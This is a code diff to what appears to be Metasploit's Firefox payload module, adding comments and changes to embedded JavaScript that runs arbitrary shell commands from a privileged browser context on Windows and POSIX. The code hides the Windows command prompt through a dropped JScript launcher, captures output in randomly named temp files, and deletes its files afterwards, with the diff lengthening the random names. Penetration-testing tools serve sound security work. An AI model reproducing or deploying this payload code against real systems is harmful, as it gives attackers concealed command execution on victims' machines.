@@ -2,6 +2,11 @@
 require 'msf/core'
 
 module Msf::Payload::Firefox
+
+  # Javascript source code of readFile(path) - synchronously reads a file and returns
+  # its contents. The file is deleted immediately afterwards.
+  #
+  # @return [String] javascript source code that exposes the readFile(path) method
   def read_file_source
     %Q|
       var readFile = function(path) {
@@ -29,6 +34,20 @@ module Msf::Payload::Firefox
     |
   end
 
+  # Javascript source code of runCmd(str) - runs a shell command on the OS
+  #
+  # Because of a limitation of firefox, we cannot retrieve the shell output
+  # so the stdout/err are instead redirected to a temp file, which is read and
+  # destroyed after the command completes.
+  #
+  # On posix, the command is double wrapped in "/bin/sh -c" calls, the outer of
+  # which redirects stdout.
+  #
+  # On windows, the command is wrapped in two "cmd /c" calls, the outer of which
+  # redirects stdout. A JScript file "launch" file is then used to run the command
+  # without displaying the command prompt.
+  #
+  # @return [String] javascript source code that exposes the runCmd(str) method.
   def run_cmd_source
     %Q|
       var ua = Components.classes["@mozilla.org/network/protocol;1?name=http"]
@@ -37,14 +56,16 @@ module Msf::Payload::Firefox
       var jscript = (#{JSON.unparse({:src => jscript_launcher})}).src;
       var runCmd = function(cmd) {
         var shEsc = "\\\\$&";
+        var shPath = "/bin/sh -c"
         var windows = (ua.indexOf("Windows")>-1);
 
         if (windows) {
+          shPath = "cmd /c";
           shEsc = "\\^$&";
           var jscriptFile = Components.classes["@mozilla.org/file/directory_service;1"]
             .getService(Components.interfaces.nsIProperties)
             .get("TmpD", Components.interfaces.nsIFile);
-          jscriptFile.append('#{Rex::Text.rand_text_alphanumeric(8)}.js');
+          jscriptFile.append('#{Rex::Text.rand_text_alphanumeric(8+rand(12))}.js');
           var stream = Components.classes["@mozilla.org/network/safe-file-output-stream;1"]
             .createInstance(Components.interfaces.nsIFileOutputStream);
           stream.init(jscriptFile, 0x04 \| 0x08 \| 0x20, 0666, 0);
@@ -56,8 +77,8 @@ module Msf::Payload::Firefox
           }
         }
 
-        var stdoutFile = "#{Rex::Text.rand_text_alphanumeric(8)}";
-        var stderrFile = "#{Rex::Text.rand_text_alphanumeric(8)}";
+        var stdoutFile = "#{Rex::Text.rand_text_alphanumeric(8+rand(12))}";
+        var stderrFile = "#{Rex::Text.rand_text_alphanumeric(8+rand(12))}";
 
         var stdout = Components.classes["@mozilla.org/file/directory_service;1"]
           .getService(Components.interfaces.nsIProperties)
@@ -70,12 +91,12 @@ module Msf::Payload::Firefox
         stderr.append(stderrFile);
 
         if (windows) {
-          var shell = "cmd /c "+cmd;
-          shell = "cmd /c "+shell.replace(/\\W/g, shEsc)+" >"+stdout.path+" 2>"+stderr.path;
+          var shell = shPath+" "+cmd;
+          shell = shPath+" "+shell.replace(/\\W/g, shEsc)+" >"+stdout.path+" 2>&1";
           var b64 = svcs.btoa(shell);
         } else {
-          var shell = ["/bin/sh", "-c", cmd.replace(/\\W/g, shEsc)].join(".");
-          shell = "/bin/sh -c "+(shell + " >"+stdout.path+" 2>"+stderr.path).replace(/\\W/g, shEsc);
+          var shell = shPath+" "+cmd.replace(/\\W/g, shEsc);
+          shell = shPath+" "+shell.replace(/\\W/g, shEsc) + " >"+stdout.path+" 2>&1";
         }
         var process = Components.classes["@mozilla.org/process/util;1"]
           .createInstance(Components.interfaces.nsIProcess);
@@ -87,23 +108,24 @@ module Msf::Payload::Firefox
           process.init(sh);
           var args = [jscriptFile.path, b64];
           process.run(true, args, args.length);
+          jscriptFile.remove(true);
+          return [cmd+"\\r\\n"+readFile(stdout.path), readFile(stderr.path)];
         } else {
           sh.initWithPath("/bin/sh");
           process.init(sh);
-          process.run(true, ["-c", shell], 2);
-        }
-
-        if (windows) {
-          jscriptFile.remove(true);
-          return [cmd+"\\r\\n"+readFile(stdout.path), readFile(stderr.path)];
-        }
-        else {
+          var args = ["-c", shell];
+          process.run(true, args, args.length);
           return [readFile(stdout.path), readFile(stderr.path)];
         }
       };
     |
   end
 
+  # This file is dropped on the windows platforms to a temp file in order to prevent the
+  # cmd.exe prompt from appearing. It is executed and then deleted.
+  #
+  # @return [String] JScript that reads its command-line argument, decodes
+  # base64 and runs it as a shell command.
   def jscript_launcher
     %Q|
       var b64 = WScript.arguments(0);
